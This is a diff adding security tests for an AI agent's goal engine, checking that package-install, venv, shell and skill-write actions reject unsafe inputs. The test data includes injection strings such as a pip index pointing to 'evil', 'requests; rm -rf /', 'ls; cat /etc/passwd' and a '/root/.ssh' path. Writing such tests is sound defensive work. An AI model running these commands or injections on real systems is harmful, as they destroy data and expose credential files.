@@ -225,6 +225,104 @@ async def test_write_skill_creates_file(tmp_path, monkeypatch):
 
 
 @pytest.mark.asyncio
+@pytest.mark.parametrize(
+    "pkg",
+    [
+        "--index-url http://evil/x",
+        "-r /etc/passwd",
+        "./localdir",
+        "git+https://evil/repo.git",
+        "requests; rm -rf /",
+        "-e .",
+    ],
+)
+async def test_install_package_rejects_pip_option_injection(pkg):
+    engine, _, _ = _make_engine([json.dumps({"done": True, "summary": "x"})])
+    state = GoalState(goal_id="test", objective="test")
+    success, result = await engine._action_install_package({"pkg": pkg}, state)
+    assert not success
+    assert "invalid" in result.lower() or "outside" in result.lower()
+
+
+@pytest.mark.asyncio
+async def test_install_package_accepts_valid_specs():
+    engine, _, _ = _make_engine([json.dumps({"done": True, "summary": "x"})])
+    state = GoalState(goal_id="test", objective="test")
+    # Valid specs must pass validation (they fail later only at the pip step,
+    # which we don't reach here because the regex gate is what we assert).
+    import core.goal.goal_engine as ge_mod
+
+    assert ge_mod._PKG_SPEC_RE.match("requests")
+    assert ge_mod._PKG_SPEC_RE.match("requests[security]")
+    assert ge_mod._PKG_SPEC_RE.match("requests>=2.0")
+    assert not ge_mod._PKG_SPEC_RE.match("--upgrade")
+    # Sanity: the action rejects the obviously-bad ones.
+    ok, _ = await engine._action_install_package({"pkg": "--upgrade"}, state)
+    assert not ok
+
+
+@pytest.mark.asyncio
+async def test_create_venv_rejects_path_outside_home(tmp_path):
+    engine, _, _ = _make_engine([json.dumps({"done": True, "summary": "x"})])
+    state = GoalState(goal_id="test", objective="test")
+    for bad in ("/etc/profile.d/x", "/usr/local/bin", "/root/.ssh/keys"):
+        success, result = await engine._action_create_venv({"path": bad}, state)
+        assert not success
+        assert "forbidden" in result.lower()
+
+
+@pytest.mark.asyncio
+async def test_run_shell_blocks_compound_command():
+    engine, _, _ = _make_engine([json.dumps({"done": True, "summary": "x"})])
+    state = GoalState(goal_id="test", objective="test")
+    # A read-only prefix followed by a chained exfiltration must be blocked by
+    # the policy gate (compound commands are not allowed).
+    success, result = await engine._action_run_shell(
+        {"command": "ls; cat /etc/passwd"}, state
+    )
+    assert not success
+    assert "policy" in result.lower() or "blocked" in result.lower()
+
+
+@pytest.mark.asyncio
+async def test_write_skill_refuses_overwrite(tmp_path, monkeypatch):
+    import core.goal.goal_engine as ge_mod
+
+    monkeypatch.setattr(ge_mod, "_SKILL_DIR", tmp_path)
+    engine, _, _ = _make_engine([json.dumps({"done": True, "summary": "x"})])
+    state = GoalState(goal_id="test", objective="test")
+
+    params = {"name": "dup", "description": "d", "code": "x = 1\n"}
+    ok1, _ = await engine._action_write_skill(params, state)
+    assert ok1
+    ok2, result = await engine._action_write_skill(params, state)
+    assert not ok2
+    assert "already exists" in result.lower()
+
+
+@pytest.mark.asyncio
+async def test_start_goal_enforces_concurrency_cap():
+    never_done = json.dumps(
+        {"done": False, "action": {"type": "message", "params": {"text": "go"}}}
+    )
+    engine, _, _ = _make_engine([never_done] * 500)
+    import core.goal.goal_engine as ge_mod
+
+    monkeypatch_delay = ge_mod._ITER_DELAY_S
+    ge_mod._ITER_DELAY_S = 5.0  # keep loops alive/busy so they stay "active"
+    try:
+        for _ in range(ge_mod._MAX_CONCURRENT_GOALS):
+            await engine.start_goal("keep running")
+        await asyncio.sleep(0.05)
+        with pytest.raises(RuntimeError):
+            await engine.start_goal("one too many")
+    finally:
+        ge_mod._ITER_DELAY_S = monkeypatch_delay
+        for gid in list(engine.list_active()):
+            await engine.stop_goal(gid)
+
+
+@pytest.mark.asyncio
 async def test_unknown_action_returns_failure():
     done_response = json.dumps({"done": True, "summary": "Done"})
     engine, _, _ = _make_engine([done_response])
